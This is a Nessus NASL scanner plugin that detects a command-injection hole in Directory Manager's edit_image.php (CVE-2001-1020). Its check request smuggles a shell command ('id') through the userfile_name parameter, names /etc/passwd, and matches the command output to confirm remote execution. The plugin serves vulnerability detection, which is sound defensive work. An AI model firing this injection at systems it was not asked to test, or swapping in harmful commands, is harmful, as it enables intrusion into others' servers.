# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# GPL
#
# Ref: http://cert.uni-stuttgart.de/archive/bugtraq/2001/09/msg00052.html
# 

 desc = "
Directory Manager is installed and does not properly filter user input.
A cracker may use this flaw to execute any command on your system.

Solution : Upgrade your software or firewall your web server
Risk factor : High";



if(description)
{
 script_id(11104);
 script_bugtraq_id(3288);
 script_version ("$Revision: 1.10 $");
 script_cve_id("CVE-2001-1020");
 
 name["english"] = "Directory Manager's edit_image.php";
 script_name(english:name["english"]);
 
 script_description(english:desc);
 
 summary["english"] = "Detects edit_image.php";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);


http_check_remote_code (
			check_request:"/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name=%20;id;%20",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			description:desc,
			port:port
			);
